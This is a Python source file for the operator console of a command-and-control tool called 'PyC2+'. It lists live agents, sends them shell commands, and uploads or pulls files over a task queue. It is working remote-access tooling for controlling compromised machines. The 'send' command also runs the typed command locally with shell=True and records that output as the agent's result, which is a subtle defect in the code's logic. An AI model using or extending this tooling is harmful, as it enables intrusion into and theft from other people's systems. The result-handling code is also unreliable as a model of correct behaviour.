import time
import os
import json
from lib.config import agents, tasks, results, AGENT_TIMEOUT
from lib.routes import timestamp, save_file, auth_check
from subprocess import Popen, PIPE
import base64
import threading

# ANSI colors & formatting
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def run_local(cmd):
    try:
        p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return (out + err).strip()
    except Exception as e:
        return f"Error executing command: {e}"

def start_cli():
    time.sleep(1)

    print(CYAN + BOLD + "\n" + "="*50)
    print("                 PyC2+ CLI")
    print("="*50 + RESET)
    print(YELLOW + "Type 'help' for commands or 'exit' to quit.\n" + RESET)

    selected = None
    last_seen_index = 0

    def get_prompt():
        if selected:
            return f"\n{RED}[PyC2+ | {selected}]{RESET}> "
        return f"\n{RED}[PyC2+]{RESET}> "

    while True:
        try:
            cmd = input(get_prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{YELLOW}Exiting PyC2+ CLI...{RESET}")
            break

        if not cmd:
            continue

        if cmd.lower() == "help":
            print(CYAN + BOLD + "\nAvailable commands:" + RESET)
            print(f"{GREEN}  agents{RESET}                   - list all agents")
            print(f"{GREEN}  select <id>{RESET}              - select an agent")
            print(f"{GREEN}  send <command>{RESET}           - send shell command")
            print(f"{GREEN}  put <local> <remote>{RESET}     - upload file to agent")
            print(f"{GREEN}  get <remote_path>{RESET}        - download file from agent")
            print(f"{GREEN}  history{RESET}                  - show stored results")
            print(f"{GREEN}  watch{RESET}                    - live-feed incoming results")
            print(f"{GREEN}  exit{RESET}                     - quit CLI (server keeps running)\n")
            continue

        if cmd.lower() == "agents":
            live_agents = [
                agent_id for agent_id, info in agents.items()
                if time.time() - info["last_seen"] <= AGENT_TIMEOUT
            ]
            if not live_agents:
                print(RED + "[!] No agents connected." + RESET)
            else:
                print(CYAN + "\nConnected agents:" + RESET)
                for a in live_agents:
                    print(f"{YELLOW}  → {a}{RESET}")
            continue

        if cmd.startswith("select "):
            agent_id = cmd.split(" ")[1]
            if agent_id in agents and (time.time() - agents[agent_id]["last_seen"] <= AGENT_TIMEOUT):
                selected = agent_id
                last_seen_index = 0
                print(f"{GREEN}[+] Selected agent: {selected}{RESET}")
            else:
                print(RED + "[!] Invalid or offline agent ID." + RESET)
            continue

        # PUT FILE
        if cmd.startswith("put "):
            if not selected:
                print(RED + "[!] Select an agent first." + RESET)
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Selected agent is offline." + RESET)
                continue

            parts = cmd.split(" ")
            if len(parts) < 3:
                print(RED + "[!] Usage: put <local_path> <remote_filename>" + RESET)
                continue

            local, remote = parts[1], parts[2]
            if not os.path.isfile(local):
                print(RED + "[!] Local file not found." + RESET)
                continue

            with open(local, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()

            payload = json.dumps({"type": "put", "filename": remote, "data": b64})
            tasks[selected].put(payload)
            print(f"{GREEN}[+] Uploaded {local} → {remote} (queued for agent){RESET}")
            continue

        # GET FILE
        if cmd.startswith("get "):
            if not selected:
                print(RED + "[!] Select an agent first." + RESET)
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Selected agent is offline." + RESET)
                continue

            remote_path = cmd[len("get "):]
            payload = json.dumps({"type": "get", "path": remote_path})
            tasks[selected].put(payload)
            print(f"{GREEN}[+] Requested file: {remote_path}{RESET}")
            continue

        # SEND COMMAND
        if cmd.startswith("send "):
            if not selected:
                print(RED + "[!] Select an agent first." + RESET)
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Selected agent is offline." + RESET)
                continue

            command = cmd[len("send "):]
            tasks[selected].put(command)
            output = run_local(command)
            print(CYAN + output + RESET)
            results[selected].append({"timestamp": timestamp(), "result": output})
            continue

        # HISTORY
        if cmd.lower() == "history":
            if not selected:
                print(RED + "[!] No agent selected." + RESET)
                continue
            for entry in results[selected]:
                print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
                print(CYAN + entry["result"] + RESET)
            continue

        # WATCH
        if cmd.lower() == "watch":
            if not selected:
                print(RED + "[!] No agent selected." + RESET)
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Selected agent is offline." + RESET)
                continue

            print(f"{CYAN}\n--- LIVE RESULT FEED ({selected}) ---{RESET}\n")
            while True:
                current_results = results[selected]
                for entry in current_results[last_seen_index:]:
                    print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
                    print(CYAN + entry["result"] + RESET)
                last_seen_index = len(current_results)
                time.sleep(0.5)
                if threading.main_thread().is_alive() is False:
                    break
            continue

        # EXIT
        if cmd.lower() == "exit":
            print(YELLOW + "Leaving CLI. Server still running..." + RESET)
            break

        print(RED + "[!] Unknown command. Type 'help' for a list of commands." + RESET)
